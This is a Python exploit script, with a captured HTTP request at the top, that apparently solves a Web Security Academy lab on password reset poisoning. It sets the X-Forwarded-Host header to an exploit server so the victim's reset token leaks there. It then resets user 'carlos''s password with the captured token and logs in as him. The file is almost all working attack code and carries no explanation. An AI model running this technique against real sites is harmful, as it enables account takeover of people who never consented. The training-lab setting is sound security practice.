'''
POST /forgot-password HTTP/2
Host: 0a68002003d7f2d582ece2ea001d00fe.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a68002003d7f2d582ece2ea001d00fe.web-security-academy.net
Connection: keep-alive
Referer: https://0a68002003d7f2d582ece2ea001d00fe.web-security-academy.net/forgot-password
Cookie: session=EoIGw6doKyuthtGbKKivUV2ikFLJVxUe
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

username=wiener
'''
import requests

DOMAIN = "0a68002003d7f2d582ece2ea001d00fe.web-security-academy.net"
EXPLOIT_SERVER = "https://exploit-0a5d007d037df2118287e1ed010e0048.exploit-server.net/exploit"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/forgot-password",
    "Cookie": "session=EoIGw6doKyuthtGbKKivUV2ikFLJVxUe",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "X-Forwarded-Host": "exploit-0a5d007d037df2118287e1ed010e0048.exploit-server.net",
    "TE": "trailers"
}

def request_new_password(username):
    url = f"https://{DOMAIN}/forgot-password"
    data = {
        "username": username
    }

    response = requests.post(url, headers=HEADERS, data=data)
    
    print(response.text)

def reset_password(reset_token, new_password="peter"):
    data = {
        "temp-forgot-password-token": reset_token,
        "new-password-1": new_password,
        "new-password-2": new_password
    }
    url = f"https://0a68002003d7f2d582ece2ea001d00fe.web-security-academy.net/forgot-password?temp-forgot-password-token={reset_token}"

    response = requests.post(url, headers=HEADERS, data=data)
    print(response.text)

def login(username, password):
    url = f"https://{DOMAIN}/login"
    data = {
        "username": username,
        "password": password
    }

    response = requests.post(url, headers=HEADERS, data=data)
    
    if "Your username is:" in response.text:
        print("Logged in as", username)

# request_new_password("carlos") # ca046k3jvwwimklp2jh3baq5q78j9hvr
# reset_password("ca046k3jvwwimklp2jh3baq5q78j9hvr")
login("carlos", "peter")